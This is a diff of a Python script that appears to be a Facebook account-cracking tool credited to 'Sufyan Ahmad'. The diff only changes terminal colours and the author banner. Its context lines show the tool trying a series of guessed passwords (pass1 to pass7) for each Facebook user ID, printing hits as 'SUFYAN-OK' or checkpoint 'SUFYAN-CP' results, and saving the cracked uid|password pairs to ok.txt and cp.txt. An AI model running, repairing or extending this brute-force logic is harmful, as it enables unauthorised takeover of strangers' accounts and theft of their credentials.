@@ -78,19 +78,17 @@ logo = """
 \033[1;96m       #     #    #     #    #     # 
 \033[1;98m        #####     #     #     #####                                                                                                       
 \033[1;93m◁━━━━━━━━━━━━━━━━━━━━◈✙◈━━━━━━━━━━━━━━━━━━━━▷\033[1;97m
-
 \033[1;93m-----------------------------------------------
-\033[1;96m(~)\033[1;93m Author   : Sufyan Ahmad \033[1;97m[ \033[0;93mShabQadry \033[1;97m]
+\033[1;96m(~)\033[1;93m Author   : SuFyaN AhMad \033[1;97m[ \033[0;93mShabQadry \033[1;97m]
 
-\033[1;96m(~)\033[1;96m Github   : https://github.com/Sufyanahmad
+\033[1;96m(~)\033[1;95m Github   : https://github.com/Sufyanahmad
 
-\033[1;96m(~)\033[1;99m Facebook : www.facebook.com/Sufyanshabqadry
+\033[1;96m(~)\033[1;92m Facebook : www.facebook.com/Sufyanshabqadry
                            
-            \033[1;96nWHATSAPP NUMBER  +93489458276
+            \033[1;98m WHATSAPP NUMBER  +93489458276
 \033[1;93m-----------------------------------------------
 
 """
-
 
 
 def main():
@@ -544,7 +542,6 @@ def menu_select():
 
 	print('')
 
-	
 
 	def main(arg):
 
@@ -562,7 +559,7 @@ def menu_select():
 
 		    if 'www.facebook.com' in d['error_msg']:
 
-		        print("\033[1;93m[SUFYAN-OK] "+uid+" | "+pass1)
+		        print("\033[1;95m[SUFYAN-OK] "+uid+" | "+pass1)
 
 		        cp=open("ok.txt","a")
 
@@ -576,7 +573,7 @@ def menu_select():
 
 		    	if "access_token" in d:
 
-		            print("\x1b[1;93m[SUFYAN-OK] "+uid+" | "+pass1+"\x1b[1;0m")
+		            print("\x1b[1;95m[SUFYAN-OK] "+uid+" | "+pass1+"\x1b[1;0m")
 
 		            ok=open("ok.txt","a")
 
@@ -596,7 +593,7 @@ def menu_select():
 
 		            if 'www.facebook.com' in d['error_msg']:
 
-		                print("\033[1;96m[SUFYAN-CP] "+uid+" | "+pass2)
+		                print("\033[1;91m[SUFYAN-CP] "+uid+" | "+pass2)
 
 		                cp=open("cp.txt","a")
 
@@ -610,7 +607,7 @@ def menu_select():
 
 		                if 'access_token' in d:
 
-		                    print("\x1b[1;93m[SUFYAN-OK] "+uid+" | "+pass2+"\x1b[1;0m")
+		                    print("\x1b[1;95m[SUFYAN-OK] "+uid+" | "+pass2+"\x1b[1;0m")
 
 		                    ok=open("ok.txt","a")
 
@@ -630,7 +627,7 @@ def menu_select():
 
 		                    if 'www.facebook.com' in d['error_msg']:
 
-		                        print("\033[1;96m[SUFYAN-CP] "+uid+" | "+pass3)
+		                        print("\033[1;91m[SUFYAN-CP] "+uid+" | "+pass3)
 
 		                        cp=open("ok.txt","a")
 
@@ -644,7 +641,7 @@ def menu_select():
 
 		                        if 'access_token' in d:
 
-		                            print(" \x1b[1;93m[SUFYAN-OK] "+uid+" | "+pass3+"\x1b[1;0m")
+		                            print(" \x1b[1;95m[SUFYAN-OK] "+uid+" | "+pass3+"\x1b[1;0m")
 
 		                            ok=open("ok.txt","a")
 
@@ -664,7 +661,7 @@ def menu_select():
 
 		                            if 'www.facebook.com' in d['error_msg']:
 
-		                                print("\033[1;96m[SUFYAN-CP] "+uid+" | "+pass4)
+		                                print("\033[1;91m[SUFYAN-CP] "+uid+" | "+pass4)
 
 		                                cp=open("cp.txt","a")
 
@@ -678,7 +675,7 @@ def menu_select():
 
 		                                if 'access_token' in d:
 
-		                                    print("\x1b[1;93m[SUFYAN-OK] "+uid+" | "+pass4+"\x1b[1;0m")
+		                                    print("\x1b[1;95m[SUFYAN-OK] "+uid+" | "+pass4+"\x1b[1;0m")
 
 		                                    ok=open("ok.txt","a")
 
@@ -698,7 +695,7 @@ def menu_select():
 
 		                                    if 'www.facebook.com' in d['error_msg']:
 
-		                                        print("\033[1;93m[SUFYAN-OK] "+uid+" | "+pass5)
+		                                        print("\033[1;95m[SUFYAN-OK] "+uid+" | "+pass5)
 
 		                                        cp=open("cp.txt","a")
 
@@ -712,7 +709,7 @@ def menu_select():
 
 		                                        if 'access_token' in d:
 
-		                                            print("\x1b[1;93m[SUFYAN-OK] "+uid+" | "+pass5+"\x1b[1;0m")
+		                                            print("\x1b[1;95m[SUFYAN-OK] "+uid+" | "+pass5+"\x1b[1;0m")
 
 		                                            ok=open("ok.txt","a")
 
@@ -732,7 +729,7 @@ def menu_select():
 
 		                                            if 'www.facebook.com' in d['error_msg']:
 
-		                                                print("\033[1;93m[SUFYAN-OK] "+uid+" | "+pass6)
+		                                                print("\033[1;95m[SUFYAN-OK] "+uid+" | "+pass6)
 
 		                                                cp=open("cp.txt","a")
 
@@ -746,7 +743,7 @@ def menu_select():
 
 		                                                if 'access_token' in d:
 
-		                                                    print("\x1b[1;93m[SUFYAN-OK] "+uid+" | "+pass6+"\x1b[1;0m")
+		                                                    print("\x1b[1;95m[SUFYAN-OK] "+uid+" | "+pass6+"\x1b[1;0m")
 
 		                                                    ok=open("ok.txt","a")
 
@@ -766,7 +763,7 @@ def menu_select():
 
 		                                                    if 'www.facebook.com' in d['error_msg']:
 
-		                                                        print("\033[1;93m[SUFYAN-OK] "+uid+" | "+pass7)
+		                                                        print("\033[1;95m[SUFYAN-OK] "+uid+" | "+pass7)
 
 		                                                        cp=open("cp.txt","a")
 
@@ -780,7 +777,7 @@ def menu_select():
 
 		                                                        if 'access_token' in d:
 
-		                                                            print("\x1b[1;93m[SUFYAN-OK] "+uid+" | "+pass7+"\x1b[1;0m")
+		                                                            print("\x1b[1;95m[SUFYAN-OK] "+uid+" | "+pass7+"\x1b[1;0m")
 
 		                                                            ok=open("ok.txt","a")
 
